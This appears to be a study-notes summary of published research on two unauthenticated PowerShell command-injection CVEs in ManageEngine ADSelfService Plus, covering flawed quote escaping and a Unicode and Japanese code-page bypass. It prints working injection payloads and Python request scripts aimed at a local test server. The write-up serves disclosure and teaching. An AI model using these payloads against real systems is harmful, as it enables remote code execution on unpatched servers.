# Writeup - PowerShell script, Unicode quotes and ウィンドウズ - a story of uncommon command injection

- writeup can be found at [this](https://blog.stmcyber.com/powershell-unicode-quotes-and-command-injection/) link


<br>
<br>

## Description

- This is a writeup about the RCE vulnerability found in __[ManageEngine's ADSSP Program](https://www.manageengine.com/products/self-service-password/)__ during 2021.

- The two researchers together were able to find two CVEs in the same year in the Same software, which are continuation of each other.

- Initially the researchers got  [`CVE-2021-28958`](https://blog.stmcyber.com/vulns/cve-2021-28958/) and further once a patch was released, they again exploited and extended version of the same RCE getting [`CVE-2021-33055`](https://blog.stmcyber.com/vulns/cve-2021-33055/)

- This writeup was about how a simple feature of __Password Change API__ in __ManageEngine's ADSSP__, exploiting which the researchers were able to show case a  _Unauthenticated Remote Code Execution_ Vulnerability.


<br>
<br>

## Details

- During the early stages of the year 2021, researchers _Krzysztof Andrusiak_ & _Marcin Ogorzelski_, were doing some vulnerability research on ManageEngine ADSelfSerivcePlus.

- During there research they were able to find an Unauthenticated RCE in the Password Change API of the webportal. Made in Java, the application was dynamically crafting Powershell Commands. An example of that is:

```powershell
// newPassword variable was controlled by user (in one of the HTTP POST parameters sent during password change request in API)
String script = "[..snip..];$newpassword = ConvertTo-SecureString -String \"" + powerShellEscape(newPassword) + "\" -AsPlainText -Force; [..snip..]";
// Commands from this string were then executed in PowerShell
```
- during the analysis of the `powerShellEscape()` function, it was identified that it was not sanitizing double quotes properly.

- if we see clearly, this looks just like SQL-injection, but in our case, this is Command Injection. Simply escaping the Quotation Mark and Injecting a payload below would execute the `whoami` command over the server side.


```
// paylaod

";whoami;echo "
```

- This till now was the __CVE-2021-28958__.

<br>
<br>


## Next Steps

- The researchers reported the vulnerability to the Vendors and it got patched soon. The `powerShellEscape()` function now sanitized the following characters:

```python
{ "`", "$", "\"", "\r", "\n", "#", "}", "{", "'" }
```

- This is where the second CVE, __CVE-2021-33055__ comes in.


- the researchers looked up `General Punctuation` of Unicode to see if they can find some alternatives to double quotes.


#### Unicode, UTF-8, Code Pages

- __Unicode__ - is a universal dictionary mapping characters to an ID,called Unicode ID. For example `U+20b9` is id for Rupees symbol


- __UTF-8__ : this is an encoding scheme, which helps to map these Unicode Character IDs to actual computer bytes.

- __Code Pages__ : Historically, bytes were mapped directly to characters, no ID in between, there are many different Code Pages in windows that map different bytes with different characters. In a certain code page, `0x82` might mean `é`, in another code page `0x82` might represent some other character. Modern __UTF-8__ is also represented as a Code Page in Windows (cp65001)


#### Powershell support

- It turns out powerhsell supports several unicode charater quotes to represent string data as well.

```powershell
echo ”abc”; # U+201D quotes
```

- above intstruction works well and simply prints `abc`.

- The interesting thing that was discovered again by the researchers was that you can interchangeable use these quotes in any order. so the following instruction:

```powershell
echo  "abc“; # still works!
```

<br>

- Since powershell (core version) is opensource, the researchers were able to verify that this was an intented behaviour. The `SpecialChars` class is defined for that [here](https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/parser/CharTraits.cs#L6).


<br>
<br>

## POC

- for the POC and to test the theory, the researchers made a working environment, and a simple Server in Java, [PoShl](https://github.com/STMCyber/PoShI), which would mimic just the vulnerable password change functionality of ManageEngine ADSelfSerivcePlus.


- The server takes a `GET` request with a _format_ paramater, which fetches the date of the system using powershell in the backend.

```
GET /date?format=dd HTTP/1.0s
```

- this program also has `powerShellEscape()` like function, called `escapePosh()`. It does the same sanitization, including the patches for CVE-2021-28958.

 - Web server functionality is shown below

 ![web-server](https://blog.stmcyber.com/wp-content/uploads/2021/08/image-1.png)


 - Long story short, now the researchers tried there devised payload:

 ```python
 import requests
r = requests.get("http://localhost:8000/date?format=dd\u201D;whoami;echo \u201D")
print(r.text)
 ```

 - But it didn't work. So, to see what was actually happening, they set up EventViewer to log all commands being executed by Powershell by fidgeting with Registry.

 - It was indentified that the Code Page being used by Windows was converting the Unicode Character into some other character mapped according to the cp437.

 - so the researchers started searching for any code pages where the attack might be possible.

 - surely enough, the code page for locale `ja-JP` Japan: CP932, has a character `\x81h` or `0x81 0x68`, which was equivalent for unicode iD `\u201D`


- Hence, Japanese Systems, using cp932, will be vulnerable to the following expoit:

```python
import requests
r = requests.get(b"http://localhost:8000/date?format=dd\x81\x68;whoami;echo \x81\x68")
print(r.text)
```

- After testing it, it was indentified that `\x81\x68` is not a valid character in UTF-8, so the researcher found a workaround, used `0xC2 0x81 0x68` for the injected payload.

<br>
<br>

## Exploited

- so the below payload worked to provide Unaithenticated RCE:

```python
import requests
r = requests.get(b"http://localhost:8000/date?format=dd\xc2\x81\x68;whoami;echo \xc2\x81\x68")
print(r.text)
```

- Hence CVE-2021-33055 was born.

<br>
<br>

## Important

- This Exploit only works till `ManageEngine ADSelfSerivcePlus version 6105`.

- a simple lookup shows that, any software of this vendor installed before __[May 2021](https://www.manageengine.com/products/self-service-password/release-notes.html)__ and not updated/patched, is at risk of getting exploited by this vulnerbility.
